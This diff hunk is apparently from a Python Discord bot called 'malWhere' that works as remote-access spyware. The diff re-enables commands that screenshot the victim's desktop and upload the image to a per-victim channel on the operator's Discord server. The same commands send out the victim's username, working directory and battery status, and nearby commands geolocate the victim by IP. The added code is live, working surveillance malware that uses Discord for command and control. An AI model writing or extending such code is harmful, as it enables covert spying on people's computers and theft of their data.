@@ -79,39 +79,37 @@ async def geolocate(ctx):
   else:
     await ctx.channel.send("wrong channel skid")
 
+@malWhere.command()
+async def screenshot(ctx):
+    guild = malWhere.get_guild(874824520467349504)
+    existing_channel = discord.utils.get(guild.channels, name=(f"{ip4chan}-media"))
+    channel_id = existing_channel.id
+    if not existing_channel:
+      await guild.create_text_channel(f"{ip4chan}-media")
+    myScreenshot = pyautogui.screenshot()
+    myScreenshot.save(r'tempimage.png')
+    with open('tempimage.png', 'rb') as f:
+      picture = discord.File(f)
+      mediachan=malWhere.get_channel(channel_id)
+      await mediachan.send(file=picture)
+      
+@malWhere.command()
+async def pcinfo(ctx):
+  if str(ctx.channel)==(ip4chan):
+    battery = psutil.sensors_battery()
+    plugged = battery.power_plugged
+    percent = str(battery.percent)
+    plugged = "Plugged In" if plugged else "Not Plugged In"
+    embed=discord.Embed(title="PC Info", url="", description=f"{ip}'s PC data", color=0xFF5733)
+    embed.add_field(name="Username", value=getpass.getuser(), inline=False)
+    embed.add_field(name="Current Working Directory", value=os.getcwd(), inline=False)
+    embed.add_field(name="battery status", value=f"Battery Percentage is {percent}%")
+    embed.add_field(name="Plugged In",value=f" Battery is {plugged}")
+    await ctx.send(embed=embed)
+    await ctx.message.delete()
+  else:
+    await ctx.channel.send("wrong channel skid")
 
-#commented out due to not working on relpit but working on Windows
-# @malWhere.command()
-# async def screenshot(ctx):
-#     guild = malWhere.get_guild(874824520467349504)
-#     existing_channel = discord.utils.get(guild.channels, name=(f"{ip4chan}-media"))
-#     channel_id = existing_channel.id
-#     if not existing_channel:
-#       await guild.create_text_channel(f"{ip4chan}-media")
-#     myScreenshot = pyautogui.screenshot()
-#     myScreenshot.save(r'tempimage.png')
-#     with open('tempimage.png', 'rb') as f:
-#       picture = discord.File(f)
-#       mediachan=malWhere.get_channel(channel_id)
-#       await mediachan.send(file=picture)
-
-# @malWhere.command()
-# async def pcinfo(ctx):
-#   if str(ctx.channel)==(ip4chan):
-#     battery = psutil.sensors_battery()
-#     plugged = battery.power_plugged
-#     percent = str(battery.percent)
-#     plugged = "Plugged In" if plugged else "Not Plugged In"
-#     embed=discord.Embed(title="PC Info", url="", description=f"{ip}'s PC data", color=0xFF5733)
-#     embed.add_field(name="Username", value=getpass.getuser(), inline=False)
-#     embed.add_field(name="Current Working Directory", value=os.getcwd(), inline=False)
-#     embed.add_field(name="battery status", value=f"Battery Percentage is {percent}%")
-#     embed.add_field(name="Plugged In",value=f" Battery is {plugged}")
-#     await ctx.send(embed=embed)
-#     await ctx.message.delete()
-#   else:
-#     await ctx.channel.send("wrong channel skid")
-#############################################################################
 @malWhere.command()
 async def rickroll(ctx):
   try:
